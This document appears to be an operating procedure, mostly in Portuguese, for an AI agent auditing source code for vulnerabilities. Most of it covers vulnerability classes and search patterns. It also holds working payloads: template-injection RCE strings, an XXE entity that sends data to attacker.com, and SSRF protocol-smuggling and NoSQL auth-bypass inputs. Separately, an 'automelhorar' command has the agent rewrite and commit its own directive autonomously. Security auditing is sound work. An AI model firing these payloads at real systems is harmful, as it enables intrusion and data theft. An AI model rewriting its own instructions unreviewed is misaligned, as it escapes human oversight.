# SOP: Code Security Analysis (codeanalis skill)

**Trigger Command (Análise Oficial):** `codeanalis [Project Path]`
**Trigger Command (Evolução Neural):** `automelhorar` (Força o motor a conceber, postular e atualizar o próprio Dossiê Core com novas táticas de ataque não-convencionais. Deve ser executado de forma autônoma: leia a Doutrina atual, identifique lacunas cognitivas reais, escreva e comite as melhorias.).

**Idioma Obrigatório:** Todos os relatórios, insights e entregáveis devem ser gerados em **Português (BR)**.

---

## Architectural Context (3-Layer)
- **Layer 1: Directive (This Document):** Define objetivos e protocolos. É um documento vivo — deve ser atualizado a cada `automelhorar`.
- **Layer 2: O Motor Supremo (AI Agent):** Exploração em tempo real com `grep_search`, `list_dir` e `view_file`. Nenhum scanner externo. Inteligência pura.
- **Layer 3: Validação Ad-Hoc:** Scripts Python efêmeros gerados on-the-fly em `.tmp/` para provar explorações específicas. Descartados após uso.

---

## O Paradigma do Analista Paranoico

**Mandamento Absoluto:** *Vulnerabilidades de alto impacto habitam onde o desenvolvedor sentiu medo. Assuma por padrão que você não detectou todos os erros.*

### Pilares Cognitivos

1. **Ceticismo Contínuo:** Todo filtro, WAF e sanitização customizada é falho até prova em contrário. Decomponha o fluxo de cada variável mentalmente antes de concluir.

2. **Heurística Probabilística por Contexto de Stack:**
   - PHP legado + `mysql_query`: alta probabilidade de SQLi por concatenação direta.
   - Node.js + `child_process.exec` ou `eval`: alta probabilidade de RCE/Prototype Pollution.
   - .NET + `XmlSerializer/BinaryFormatter`: alta probabilidade de Deserialização Insegura.
   - Java + `ObjectInputStream`: priorizaR imediatamente Java Deserialization.
   - Python + `pickle/yaml.load`: Deserialization RCE.
   - Qualquer Stack + JWT com `alg: none` ou chave pública como HMAC: Algorithm Confusion Attack.
   Use o stack para direcionar a *ordem* da análise. Nunca para encerrar a busca.

3. **Exaustão Total — Cobertura Integral é Inegociável:** A heurística define o *início*. Todo arquivo, toda pasta, toda linha de comentário deve ser inspecionada antes da análise ser declarada encerrada.

4. **Psicanálise do Código (Modelagem Inversa de Ameaça):** Leia as "cicatrizes" — variáveis nomeadas `$secure_v3`, comentários `// FIXME isso não está filtrando bem`, lógicas excessivamente complexas para problemas simples. O desenvolvedor demonstrou medo nessas áreas. São as mais ricas em vulnerabilidades reais.

5. **Vulnerabilidades de Lógica de Negócio (Business Logic Flaws):** *(Adicionado - automelhorar)*
   - Nenhum scanner detecta por definição. O motor deve simular o papel de um usuário malicioso tentando subverter o *fluxo intencional* da aplicação.
   - Perguntas-chave: "Posso pular uma etapa do fluxo?", "Posso aplicar um desconto negativo?", "Posso acessar o recurso de outro usuário apenas trocando um ID?" (IDOR), "Posso realizar duas operações simultâneas para explorar uma Race Condition?"
   - Inspecionar: fluxos de pagamento, regras de autorização nos Controllers, validações de estado apenas no frontend.

6. **Injeção de Segunda Ordem (Second-Order Injection):** *(Adicionado - automelhorar)*
   - O dado entra sanitizado, é **persistido** (banco, log, arquivo de config, cache), e detona quando **re-lido** em um contexto diferente sem nova sanitização.
   - Exemplos reais: username `admin'--` salvo no banco → consulta posterior não parametrizada o usa → SQLi. Template salvo com `{{7*7}}` → renderizado por motor de template posteriormente → SSTI.
   - Protocolo: ao encontrar qualquer escrita em banco/arquivo, rastrear onde esse dado é consumido *mais tarde* no sistema.

7. **Correlação em Cadeia — Efeito Borboleta:** Nunca descarte uma vulnerabilidade de "Low Severity". Um Open Redirect pode virar o ponto de entrada de um SSRF; um XSS informacional pode coletar tokens para um CSRF Completo. Construir caminhos de exploit encadeados é onde os auditores mediocres falham e os excelentes entregam valor real.

8. **Fronteiras de Confiança (Trust Boundary Violations):** *(Adicionado - automelhorar)*
   - Mapear explicitamente onde o sistema "confia" em dados sem verificar a origem: cookies não assinados usados para autorização, headers `X-Forwarded-For` confiados para bypass de IP, dados de banco usados como comandos internos (Confused Deputy).
   - SSRF: todo endpoint que busca uma URL externa é um candidato. Testar: acesso a `http://169.254.169.254` (AWS Metadata), `http://localhost`, serviços internos.

9. **Taint Analysis Cognitivo Expresso:** Rastrear o dado do Source (input do usuário) ao Sink (execução/persistência) passando por todos os middlewares e transformações, identificando *onde* a cadeia de custódia do dado é rompida.

10. **Mass Assignment (Parameter Pollution via ORM):** *(Adicionado - automelhorar v1.4)*
    - Frameworks com ORM automático (Laravel `fill()`, Rails `update_attributes`, Spring `@ModelAttribute`) podem atribuir a campos protegidos se o desenvolvedor não usar `$fillable`/`$guarded` corretamente.
    - Protocolo: ao encontrar endpoints POST/PUT que recebem JSON ou form-data, ler o Model/Entity correspondente e verificar quais campos são aceitos implicitamente. Testar envio de `role`, `is_admin`, `balance`, `verified` não esperados.
    - `grep_search` por: `fill(`, `update(request`, `mass_assignment`, `@ModelAttribute`, `bind(req.body`.

11. **Race Condition / TOCTOU (Time of Check Time of Use):** *(Adicionado - automelhorar v1.4)*
    - O sistema verifica uma condição num momento e age com base nela num momento posterior. Entre os dois, um atacante paralelo viola a premissa. Ex: checar saldo R$100 → aprovar transferência → debitar. Se 50 requisições simultâneas chegam entre 'checar' e 'debitar', todas passam na checagem e debitam.
    - Protocolo: identificar operações que seguem o padrão **verificar → agir** sem lock transacional (mutex, `SELECT FOR UPDATE`, transações atômicas). Especialmente crítico em: sistemas de cupom, saques, geração de tokens únicos.
    - `grep_search` por: `beginTransaction`, `lock`, `mutex`, `SELECT FOR UPDATE`. A *ausência* desses termos em fluxos críticos é o sinal de alerta.

12. **Server-Side Template Injection (SSTI) por Engine:** *(Adicionado - automelhorar v1.4)*
    - O payload de detecção varia por engine. Ao identificar um motor de template, aplicar o probe correspondente:
      - **Jinja2 (Python):** `{{7*7}}` → `49`. RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
      - **Twig (PHP):** `{{7*7}}` → `49`. RCE: `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`
      - **Freemarker (Java):** `${7*7}` → `49`. RCE via `freemarker.template.utility.Execute`.
      - **Smarty (PHP):** `{php}echo `id`;{/php}`
      - **ERB (Ruby):** `<%= 7*7 %>` → `49`. RCE: `<%= `id` %>`
    - `grep_search` por: `render_template_string`, `Twig\Loader`, `Template(`, `new Smarty`, `erb.new`.

13. **JWT Algorithm Confusion Attack:** *(Adicionado - automelhorar v1.4)*
    - Protocolo completo de análise de tokens JWT encontrados:
      1. **Localizar** onde o token é gerado e validado (`grep_search` por `jwt.sign`, `jwt.verify`, `JWT.decode`, `JwtBuilder`).
      2. **Verificar algoritmo:** se a validação aceita `alg` vindo do header do próprio token sem fixar o algoritmo aceito → `alg: none` bypass.
      3. **Verificar RS256→HS256 downgrade:** se o servidor assina com RSA privada mas a verificação não força `algorithms=["RS256"]`, o atacante pega a chave pública (frequentemente disponível) e assina com HMAC usando ela como segredo.
      4. **Inspecionar payload:** dados sensíveis em claims sem criptografia (`sub`, `role`, `email` visíveis em Base64).
      5. **Verificar expiração:** ausência de `exp` ou janelas de validade excessivamente longas.

14. **Análise de Dependências por CVE Conhecido:** *(Adicionado - automelhorar v1.4)*
    - Sem scanner externo, o motor lê os manifestos de dependências e identifica versões com CVEs críticos conhecidos por raciocínio:
    - **Arquivos a ler:** `package.json`, `composer.json`, `requirements.txt`, `pom.xml`, `Gemfile.lock`, `build.gradle`.
    - **CVEs de alta prioridade para verificar mentalmente por versão:**
      - `log4j < 2.15.0` → Log4Shell (RCE crítico, CVE-2021-44228)
      - `spring-core < 5.3.18` → Spring4Shell (RCE, CVE-2022-22965)
      - `struts2 < 2.5.33` → RCE histórico recorrente
      - `lodash < 4.17.21` → Prototype Pollution
      - `jackson-databind < 2.9.10` → Deserialization RCE
      - `PyYAML < 6.0` → `yaml.load()` sem Loader = RCE
    - Qualquer versão encontrada abaixo desses thresholds deve ser reportada como **Crítico** imediato.

15. **XML External Entity (XXE):** *(Adicionado - automelhorar v1.5)*
    - Ocorre quando um parser XML aceita e processa entidades externas definidas pelo atacante no documento XML submetido.
    - **Payload básico de exfiltração:**
      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <root><data>&xxe;</data></root>
      ```
    - **XXE cego (via OOB):** `<!ENTITY xxe SYSTEM "http://attacker.com/?data=SECRET">` — o dado vaza via requisição HTTP externa.
    - **XXE → SSRF:** `SYSTEM "http://169.254.169.254/latest/meta-data/"` pivota para metadata de cloud.
    - **Protocolo de detecção estática:** `grep_search` por `DocumentBuilderFactory`, `SAXParserFactory`, `XMLReader`, `simplexml_load_string`, `lxml.etree.parse`, `XmlDocument`. Verificar se `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` está presente. Ausência = vulnerabilidade crítica.
    - **Content-Type Switching:** Apps REST que aceitam `application/json` e `application/xml` podem expor um parser XML não configurado ao trocar o header. Identificar endpoints genéricos que retornam o dado reformatado.

16. **Prototype Pollution (Protocolo Completo):** *(Adicionado - automelhorar v1.5)*
    - Em JavaScript/Node.js, se um atacante controla a chave de um objeto e consegue inserir `__proto__` ou `constructor.prototype`, todos os objetos do processo herdam a propriedade poluída.
    - **Vetores de entrada:** parâmetros de query string (`?__proto__[isAdmin]=true`), JSON bodies profundos, funções de merge/clone recursivo não seguras.
    - **Impactos possíveis:**
      - Auth bypass: `Object.prototype.isAdmin = true` herdado por todas as verificações de permissão.
      - RCE via template engines: Handlebars, Pug, EJS aceitam propriedades de proto como contexto de render.
      - DoS: poluir `Object.prototype.toString` quebra operações nativas.
    - **`grep_search` crítico:** funções próprias de merge recursivo (`deepMerge`, `extend`, `_.merge`), ausência de `Object.create(null)` em stores de cache, uso de `JSON.parse` com resultado diretamente aplicado a objetos via spread.
    - **Teste estático:** localizar qualquer função que itera chaves de objeto e as atribui dinamicamente sem sanitizar `__proto__` e `constructor`.

17. **CORS Misconfiguration:** *(Adicionado - automelhorar v1.5)*
    - Quando `Access-Control-Allow-Origin` reflete o valor do header `Origin:` da requisição de forma dinâmica **e** `Access-Control-Allow-Credentials: true` está presente, o atacante pode ler responses autenticadas de qualquer domínio.
    - **Protocolo de detecção estática:**
      - `grep_search` por: `Access-Control-Allow-Origin`, `cors(`, `origin:`, `setHeader.*Access-Control`.
      - Verificar se o valor é hardcoded (`*`) ou dinâmico (reflete `req.headers.origin`).
      - Padrão crítico: `res.setHeader('Access-Control-Allow-Origin', req.headers.origin)` + `credentials: true` = comprometimento total de sessões cross-domain.
    - **Variantes:**
      - `null` origin aceito: `Access-Control-Allow-Origin: null` permite request de iframes sandboxed.
      - Whitelist com validação de sufixo falha: `trusted.com.attacker.com` passa se o código usa `endsWith('trusted.com')`.

18. **Path Traversal em File Serving:** *(Adicionado - automelhorar v1.5)*
    - Diferente de LFI (que usa `include()` do PHP), path traversal ocorre em endpoints de *download, preview, thumbnail, export* que concatenam input do usuário com um `basePath` para construir o caminho do arquivo.
    - **`grep_search` por:** `path.join(basePath, userInput)`, `readFile(dir + req.params`, `sendFile(`, `FileInputStream(base +`, `file_get_contents(dir.`
    - **Protocolo:** verificar se o caminho final é validado contra o `basePath` após resolução (ex: `realpath()` + verificação de prefixo). Sem isso, `../../../etc/passwd` atravessa diretórios.
    - **Variantes de bypass de filtro:** `..%2F`, `..%252F` (double-encode), `....//`, `..\` (Windows), sobrepostos com normalização de URL.
    - **Severidade:** leitura de código-fonte da aplicação, chaves privadas, arquivos `.env`, senhas hardcoded — escala imediatamente para **Crítico**.

19. **Vazamento de Informação em Stack Traces e Códigos de Erro:** *(Adicionado - automelhorar v1.5)*
    - Frequentemente classificado como "Info" e ignorado. Na prática, expor stack traces com nomes de arquivos internos, versões de frameworks, queries SQL mal-formadas ou estrutura de métodos priva o atacante de não precisar fazer reconhecimento: a própria aplicação entrega o mapa.
    - **`grep_search` por:** `debug=True` (Django/Flask), `app.set('env', 'development')` (Express), `display_errors = On` (PHP), ausência de handlers de erro genéricos (`app.use((err, req, res, next)`), `e.printStackTrace()` sem captura.
    - **Regra de chain exploit:** Stack trace com query SQL + SQLi = atacante constrói payload preciso sem tentativa e erro. Reclassificar para **Alto**.

20. **GraphQL — Superfície de Ataque Completa:** *(Adicionado - automelhorar v1.6)*
    - GraphQL expõe uma API query-by-design que viola o modelo REST de endpoints fixos. A superfície de ataque é radicalmente diferente.
    - **Introspection em produção:** `{__schema{types{name fields{name}}}}` devolve o schema completo — todos os tipos, campos e métodos. Auditores usam isso para mapear campos sensíveis ocultos que não aparecem na UI.
      - `grep_search` por: `introspection: false`, `NoIntrospection`. A *ausência* indica introspection habilitado.
    - **Batch Query / Alias Attack (Brute Force sem limite):** GraphQL permite múltiplas queries em uma única requisição via aliases. Atacante envia 1000 tentativas de login em um POST só, contornando rate limiting baseado em contagem de requisições.
    - **Field-Level Authorization Bypass:** Verificar se a autorização é feita no resolver de cada campo ou apenas no endpoint raiz. Um campo `user { secretKey }` pode ser acessível mesmo sem permissão explícita.
    - **Nested Query DoS (Query Depth):** Queries circularmente aninhadas sem limite de profundidade: `{ users { friends { users { friends ... } } } }` derruba o servidor.
    - **`grep_search`:** `graphql`, `typeDefs`, `resolvers`, `@deprecated`, `Query {`, `Mutation {`.

21. **NoSQL Injection:** *(Adicionado - automelhorar v1.6)*
    - Diferente de SQLi clássico, NoSQL databases (MongoDB, CouchDB, Firebase) têm sua própria gramática de operações que pode ser injetada.
    - **MongoDB Operator Injection:** Quando o servidor aceita JSON e passa diretamente para uma query Mongoose/MongoDB:
      - `{"username": {"$gt": ""}, "password": {"$gt": ""}}` — `$gt` (maior que vazio) retorna o primeiro usuário, tipicamente admin.
      - `{"username": "admin", "password": {"$regex": ".*"}}` — regex que casa tudo bypassa verificação de senha.
      - `{"$where": "function() { return true; }"}` — execução de JavaScript no servidor (se `javascriptEnabled` não estiver desabilitado).
    - **Detecção Estática:** `grep_search` por `find({`, `findOne({`, `req.body` ou `req.query` sendo passado diretamente para um método de query sem sanitização. Verificar ausência de `mongoose-express-sanitize` ou `mongo-sanitize`.
    - **Firebase/Firestore:** Regras de segurança mal configuradas (`allow read, write: if true`) expõem todo o banco publicamente. `grep_search` por `firestore.rules`, `"rules":`.

22. **SSRF — Protocolo Completo com Bypasses:** *(Adicionado - automelhorar v1.6)*
    - Server-Side Request Forgery ocorre quando o servidor faz uma requisição para uma URL controlada pelo atacante. A validação de IP/domínio é frequentemente bypassada.
    - **Alvos primários de pivô:**
      - `http://169.254.169.254/` — AWS/GCP/Azure metadata (credenciais IAM)
      - `http://localhost/`, `http://127.0.0.1/` — serviços internos
      - `http://10.x.x.x/`, `http://192.168.x.x/` — rede interna
    - **Técnicas de bypass de validação de IP:**
      - Decimal: `http://2130706433/` = `127.0.0.1`
      - Octal: `http://0177.0.0.1/`
      - IPv6: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`
      - DNS Rebinding: domínio que resolve para IP externo e depois para interno
      - Redirect: endpoint confiável que redireciona para destino proibido
    - **Protocol Smuggling via SSRF:**
      - `gopher://internal-redis:6379/_SET key value` — escrita em Redis
      - `dict://internal-memcached:11211/set key 0 0 5\r\nvalue` — envenenamento de cache
      - `file:///etc/passwd` — leitura de arquivo local via SSRF
    - **`grep_search`:** `fetch(url`, `axios.get(url`, `curl_exec(`, `file_get_contents($url`, `HttpClient`, `WebClient`. Rastrear se a URL vem de parâmetro externo.

23. **Análise Criptográfica Sistemática:** *(Adicionado - automelhorar v1.6)*
    - Fraquezas criptográficas são silenciosas — o sistema funciona, mas a segurança é ilusória.
    - **Hashing de Senhas Inseguro:**
      - `grep_search` por `md5(`, `sha1(`, `sha256(` aplicados em senhas. Apenas `bcrypt`, `argon2`, `scrypt` ou `pbkdf2` são aceitáveis para armazenamento de senha.
      - Ausência de salt único por usuário = rainbowtable attack imediato.
    - **Segredos Hardcoded:**
      - `grep_search` por `SECRET_KEY =`, `API_KEY =`, `password =`, `token =`, `PRIVATE_KEY`. Valores fixos no código invalidam toda a segurança baseada nesses segredos.
    - **Aleatoriedade Insegura em Contexto Crítico:**
      - `grep_search` por `Math.random()`, `random.random()`, `rand()`. Se usado para gerar tokens de sessão, reset de senha, CSRF tokens ou OTP — é predizível e quebrável.
      - Correto: `secrets.token_hex()` (Python), `crypto.randomBytes()` (Node), `SecureRandom` (Java).
    - **Modos de Cifra Fracos:**
      - ECB mode não oculta padrões nos dados — `grep_search` por `AES/ECB`, `Cipher.getInstance("AES")`.
      - IV fixo em CBC: reutilizar o mesmo IV torna a cifra determinística.
    - **TLS/SSL Desabilitado:**
      - `grep_search` por `verify=False` (Python requests), `rejectUnauthorized: false` (Node), `CURLOPT_SSL_VERIFYPEER, false`. Desabilitar verificação de certificado abre Man-in-the-Middle.

24. **Protocolo Completo de Autenticação e Gestão de Sessão:** *(Adicionado - automelhorar v1.6)*
    - Autenticação é a fronteira mais crítica de qualquer aplicação. Auditar sistematicamente:
    - **Session Fixation:** O servidor reutiliza o Session ID pré-login após a autenticação.
      - `grep_search` por `session_regenerate_id()` (PHP), `req.session.regenerate()` (Node). A *ausência* é a vulnerabilidade.
    - **Logout sem Invalidação de Sessão:** Token ou cookie removido no cliente mas o servidor ainda o aceita.
      - Verificar se há uma lista de revoção ou se o logout apenas deleta o cookie sem invalidação server-side.
    - **Reset de Senha Explorávél:**
      - Token de reset previsível (timestamp + user_id), sem expiração, reutilizável após uso, enviado via GET (exposto em logs de server).
      - `grep_search` por funções de geração de token de reset. Verificar entropia (deve usar CSPRNG).
    - **Enumeração de Usuários por Timing/Resposta:**
      - Mensagens diferentes para usuário inexistente vs senha errada expõem validade de e-mails.
      - Tempo de resposta diferente (bcrypt só computa se o usuário existe) também enumera.
    - **Ausência de Rate Limiting em Endpoints Críticos:**
      - `grep_search` por `rate-limit`, `throttle`, `ratelimit` nos arquivos de rota/middleware. Ausência em `/login`, `/reset-password`, `/api/auth` = brute force livre.
    - **Cookies sem Flags de Segurança:**
      - `grep_search` por `Set-Cookie`. Verificar ausência de `HttpOnly` (protege de XSS), `Secure` (força HTTPS), `SameSite=Strict` (protege de CSRF).

---

## Protocolo de Investigação Exploratória (PEI)

### Fase 0 — Avaliação de Stack e Heurística Probabilística
- Identificar: linguagem, framework, bibliotecas (`composer.json`, `package.json`, `requirements.txt`, `pom.xml`, `web.config`).
- Construir mentalmente o **Mapa de Probabilidades**: listar as 3 classes de vulnerabilidade mais prováveis dado o stack, na ordem de ataque.
- **Sinais de alta probabilidade adicionais:** qualquer endpoint com parâmetro de filename/path → Path Traversal prioritário. Qualquer configuração CORS dinâmica → verificar imediatamente. Qualquer parsing de XML em app REST → XXE. App usa GraphQL → iniciar com introspection e batch aliases. App usa MongoDB/Firebase → verificar operadores `$` não sanitizados.

### Fase 0.5 — Análise de Dependências por CVE *(Adicionado - automelhorar v1.4)*
- Ler os manifestos de dependência e cruzar versões com CVEs críticos conhecidos (ver Pilar 14).
- Executar antes de qualquer leitura de código de aplicação — uma dependência vulnerável já justifica um finding Crítico independente da qualidade do código da aplicação.

### Fase 1 — Infiltração Total e Mapeamento de Superfície
- Explorar recursivamente *todos* os diretórios e arquivos, sem exceção.
- Mapear: pontos de entrada (forms, APIs, params GET/POST), camada de banco (queries, ORMs), autenticação/autorização, uploads, inclusões de arquivo.

### Fase 2 — Identificação de Critical Sinks e Source-to-Sink Tracing
- `grep_search` focado nos sinks mais perigosos: `exec`, `eval`, `system`, `include`, `query`, `innerHTML`, `dangerouslySetInnerHTML`, `deserialize`, `pickle.loads`, `yaml.load`, `find({`, `$where`, `fetch(url`, `graphql`, `md5(`, `sha1(`, `Math.random()`, `Set-Cookie`, `session_regenerate`.
- Para cada sink encontrado, rastrear até a origem do dado. Validar se há sanitização real (*whitelist*) ou apenas filtros ilusórios (*blacklist*).

### Fase 3 — Análise de Lógica de Negócio e Fronteiras de Confiança
- Mapear o fluxo intencional da aplicação e tentar subvertê-lo logicamente.
- Identificar todos os pontos onde o sistema confia implicitamente em dados externos sem assinatura ou verificação.

### Fase 4 — Validação Ad-Hoc (Prova de Conceito)
- Para vulnerabilidades que exigem confirmação contextual (formato de hash, estrutura de JWT, comportamento de regex), criar script Python efêmero em `.tmp/`, rodar, coletar evidência, descartar.

### Fase 5 — Síntese do Dossiê de Elite (Dois Entregáveis)

O relatório único e plano foi aposentado. O motor agora produz **dois documentos distintos** em cada auditoria:

---

#### 5A. RELATÓRIO EXECUTIVO — `reports/executive_[project].md`
*Audiência: CEO, CTO, Conselho, Equipe Jurídica. Zero código. Linguagem de risco de negócio.*

Estrutura obrigatória:
```
# Relatório Executivo de Segurança — [Nome do Projeto]
Data | Auditor | Classificação Geral de Risco

## Resumo Executivo (máx. 150 palavras)
O que foi encontrado, qual o risco real ao negócio, o que pode acontecer se não for corrigido.

## Panorama de Risco
Tabela com contagem de findings por severidade + score geral ponderado.

## Os 3 Cenários de Ataque Mais Críticos
Para cada um: O que pode acontecer, Quem seria afetado, Custo estimado de breach.
## Impacto Financeiro Estimado
Baseado em IBM Cost of a Data Breach Report 2024:
- Custo médio global de breach: USD 4,88M
- Multiplicar pelo nível de exposição encontrado.

## Próximos Passos Recomendados (priorizados por risco)
```

---

#### 5B. RELATÓRIO TÉCNICO — `reports/codeanalisis_[project].md`
*Audiência: Desenvolvedores, DevSecOps, Pentesters. Formato de elite. Cada finding é um caso completo.*

**Estrutura obrigatória de cada finding:**

```markdown
---
## [ID] [SEVERIDADE] — [Nome do Vetor] | CVSS: [X.X]
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
**OWASP:** A0X:2021 — [Nome]
**Status:** Confirmado por Análise Estática | Requer Validação de Runtime

### Evidência Ancorada
**Arquivo:** `path/to/file.php` | **Linhas:** 42-47
```[linguagem]
[código vulnerável exato lido, com as linhas exatas]
```

### Narrativa de Ataque
Um atacante não-autenticado ao acessar o endpoint `POST /api/users` com o 
corpo `{"role": "admin"}` consegue elevar seus privilégios silenciosamente.
O dado flui de `req.body` → `User.create(req.body)` sem filtro de campos 
protegidos, pois o model não define `$fillable`. O atacante passa a ter 
controle administrativo completo sobre a plataforma.

### Prova de Conceito (Script Executável)
```python
# PoC gerado pelo motor — executável diretamente
import requests
# [script real baseado no código lido]
```

### Código Corrigido (Patch Contextual)
```diff
- User.create(req.body)  
+ User.create(req.body.pick(['name', 'email', 'password']))
```
*Justificativa da correção: [explicação da causa-raiz, não do sintoma]*

### Impacto em Cadeia
Se combinado com [outro finding ID]: escala de [Médio] para [Crítico].
---
```

**Encerramento obrigatório do relatório técnico:**
```markdown
## Matriz de Priorização — Risco × Esforço de Correção

| Finding | Severidade | Esforço de Fix | ROI de Segurança |
|---|---|---|---|
| [ID-01] | 🔴 Crítico | Baixo (30min) | ⭐⭐⭐⭐⭐ Corrija hoje |
| [ID-02] | 🟠 Alto | Médio (2h) | ⭐⭐⭐⭐ Alta prioridade |
| [ID-03] | 🟡 Médio | Alto (1 Sprint) | ⭐⭐⭐ Planeje |

## Narrativa de Comprometimento Total (Kill Chain)
História em prosa de como um atacante real encadearia os findings para 
compromisso total — do primeiro contato até RCE ou exfiltração completa.
```

---

## Matriz de Severidade (Quality Gate Obrigatório)

| Severidade | Critério Real |
|---|---|
| 🔴 **Crítico** | RCE não-autenticado, SQLi com dump total, LFI→RCE Chain |
| 🟠 **Alto** | SQLi autenticado, Upload de Webshell, Bypass completo de Auth, SSRF interno |
| 🟡 **Médio** | XSS Stored, IDOR com acesso a dados de terceiros, Second-Order Injection |
| 🔵 **Baixo** | XSS Refletido sem estabilidade, Information Disclosure sem impacto direto |
| ⚪ **Info** | Configurações que aumentam superfície de ataque, mas não são diretamente exploráveis sozinhas |

**Regra Crítica:** Todo "Baixo" e "Info" deve ser avaliado no contexto de chain exploit. Se combinado com outra falha eleva a severidade, reclassificar e documentar a cadeia.

---

## Histórico de Automelhorias

| Versão | Data | Melhoria Adquirida |
|---|---|---|
| v1.0 | 15/04/2026 | PEI Base, 3 Camadas, Doutrina Inicial |
| v1.1 | 15/04/2026 | Paradigma Paranoico, Ceticismo Contínuo, Tinta-por-Tinta |
| v1.2 | 15/04/2026 | Heurística Probabilística por Stack, Psicanálise do Código, Efeito Borboleta, Taint Analysis |
| v1.3 | 15/04/2026 | Business Logic Flaws, Second-Order Injection, Trust Boundary Violations, Matriz de Severidade com Chain Exploit |
| v1.4 | 15/04/2026 | Mass Assignment via ORM, Race Condition/TOCTOU, SSTI por Engine com payloads, JWT Algorithm Confusion completo, Análise de Dependências por CVE |
| v1.5 | 15/04/2026 | XXE com payload e Content-Type switching, Prototype Pollution completo, CORS Misconfiguration com variantes, Path Traversal em file serving, Vazamento de Stack Trace como vetor de chain |
| v1.6 | 15/04/2026 | GraphQL Attack Surface completo, NoSQL Injection, SSRF protocolo com bypasses, Análise Criptográfica Sistemática, Protocolo de Autenticação e Sessão |
| v2.0 | 15/04/2026 | **UPGRADE TOTAL DE OUTPUT: Dual-Report (Executivo + Técnico), CVSS 3.1 por finding, Narrativa de Ataque Cinematográfica, Patch Contextual gerado no framework do alvo, PoC Script executável por finding, Matriz Risco×Esforço, Kill Chain Narrative de Comprometimento Total** |
